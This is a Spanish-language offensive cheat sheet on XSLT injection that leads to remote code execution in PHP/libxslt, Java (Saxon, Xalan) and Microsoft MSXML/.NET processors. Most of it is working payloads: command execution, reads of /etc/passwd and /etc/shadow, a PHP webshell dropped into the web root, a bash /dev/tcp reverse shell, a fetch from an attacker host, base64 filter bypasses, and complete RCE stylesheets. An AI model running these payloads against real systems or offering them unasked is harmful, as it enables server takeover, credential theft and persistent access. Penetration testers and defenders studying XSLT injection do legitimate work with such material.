---
aliases:
  - XSLT RCE
  - XSLT Extension Functions
  - 'XSLT php:function'
  - XSLT Java reflection
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
---
# XSLT - Extension Functions (RCE)

***

## PHP / libxslt

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Probe namespace | `xmlns:php="http://php.net/xsl"` | Header del stylesheet. |
| Detect | `<xsl:value-of select="function-available('php:function')"/>` | `true` si `registerPHPFunctions()` activo. |
| RCE básico | `<xsl:value-of select="php:function('system','id')"/>` | Output del comando reflejado. |
| Exec sin output | `<xsl:value-of select="php:function('shell_exec','id &gt; /tmp/o')"/>` | Para comandos que escapan stdout. |
| File read | `<xsl:value-of select="php:function('file_get_contents','/etc/passwd')"/>` | LFI directo. |
| File read remoto | `<xsl:value-of select="php:function('file_get_contents','http://attacker/x')"/>` | SSRF también. |
| Webshell drop | `<xsl:value-of select="php:function('file_put_contents','/var/www/html/sh.php','&lt;?=`$_GET[c]`?&gt;')"/>` | Persistencia. |
| Reverse shell | `<xsl:value-of select="php:function('system','bash -c &quot;bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1&quot;')"/>` | Shell interactiva. |
| Decode payload | `<xsl:value-of select="php:function('system',php:function('base64_decode','BASE64...'))"/>` | Bypass de filtros char. |
| eval via assert | `<xsl:value-of select="php:function('assert','system(\"id\")')"/>` | PHP <8.0. |
^xslt-rce-php

### Backend vulnerable típico

```php
$xsl = new XSLTProcessor();
$xsl->registerPHPFunctions();   // <-- key: habilita namespace php:function
$xsl->importStyleSheet(DOMDocument::loadXML($user_xsl));
echo $xsl->transformToXML(new DOMDocument());
```

___

## Java / Saxon

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Probe namespace | `xmlns:Runtime="java:java.lang.Runtime"` | Saxon-PE/EE only — Saxon-HE NO. |
| Detect | `<xsl:value-of select="function-available('saxon:evaluate')"/>` | `true` → PE/EE. |
| getRuntime | `<xsl:variable name="rt" select="Runtime:getRuntime()"/>` | Instance del Runtime. |
| exec simple | `<xsl:variable name="proc" select="Runtime:exec($rt, 'id')"/>` | Process con stdout capturable. |
| exec con args (array) | `<xsl:variable name="proc" select="Runtime:exec($rt, ('bash','-c','id; whoami'))"/>` | Array → quotes/pipes seguros. |
| Read stdout (Scanner) | `Scanner:next(Scanner:useDelimiter(Scanner:new(Process:getInputStream($proc)),'\A'))` | Lectura completa stdout. |
| Eval XPath dinámico | `<xsl:value-of select="saxon:evaluate(concat('Runtime:exec(...)'))"/>` | Bypass de filtros estructurales. |
| Read file binario | `<xsl:value-of select="saxon:read-binary-resource('file:///etc/shadow')"/>` | Saxon-PE/EE. |
| Xalan namespace alt | `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` | Xalan-Java permite Java estático default. |
| Xalan exec | `<xsl:variable name="p" select="rt:exec(rt:getRuntime(), 'id')"/>` | Misma idea que Saxon, namespace distinto. |
^xslt-rce-saxon

### Stylesheet completo Saxon RCE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:Runtime="java:java.lang.Runtime"
    xmlns:Process="java:java.lang.Process"
    xmlns:Scanner="java:java.util.Scanner">
  <xsl:template match="/">
    <xsl:variable name="rt" select="Runtime:getRuntime()"/>
    <xsl:variable name="proc" select="Runtime:exec($rt, 'id')"/>
    <xsl:variable name="is" select="Process:getInputStream($proc)"/>
    <xsl:variable name="sc" select="Scanner:new($is)"/>
    <xsl:variable name="_" select="Scanner:useDelimiter($sc, '\A')"/>
    <output><xsl:value-of select="Scanner:next($sc)"/></output>
  </xsl:template>
</xsl:stylesheet>
```

___

## Microsoft / MSXML

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Probe namespace MS | `xmlns:msxsl="urn:schemas-microsoft-com:xslt"` | Microsoft XSLT extensions. |
| User namespace | `xmlns:ext="urn:extension"` | Para llamar funciones definidas. |
| JScript inline | `<msxsl:script language="JScript" implements-prefix="ext">...</msxsl:script>` | Solo si `enableScript=true`. |
| ActiveXObject WSH | `var wsh = new ActiveXObject("WScript.Shell"); wsh.Exec(cmd);` | Ejecuta cmd.exe. |
| Read stdout JS | `var e = wsh.Exec("cmd /c " + c); return e.StdOut.ReadAll();` | Stdout completo. |
| C# inline | `<msxsl:script language="C#" implements-prefix="ext">...</msxsl:script>` | XslCompiledTransform en .NET. |
| C# Process | `var p = new System.Diagnostics.Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+c; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); return p.StandardOutput.ReadToEnd();` | RCE C# completo. |
| VBScript inline | `<msxsl:script language="VBScript" implements-prefix="ext">Function runCmd(cmd): Set s = CreateObject("WScript.Shell"): runCmd = s.Exec("cmd /c " & cmd).StdOut.ReadAll(): End Function</msxsl:script>` | Alternativa VBScript. |
| Detect | `<xsl:value-of select="function-available('msxsl:script')"/>` | `true` → vector activo. |
^xslt-rce-msxml

### Stylesheet completo JScript RCE

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    xmlns:ext="urn:extension">
  <msxsl:script language="JScript" implements-prefix="ext">
    <![CDATA[
      function runCmd(cmd) {
        var wsh = new ActiveXObject("WScript.Shell");
        var exec = wsh.Exec("cmd /c " + cmd);
        return exec.StdOut.ReadAll();
      }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="ext:runCmd('whoami /all')"/>
  </xsl:template>
</xsl:stylesheet>
```

***
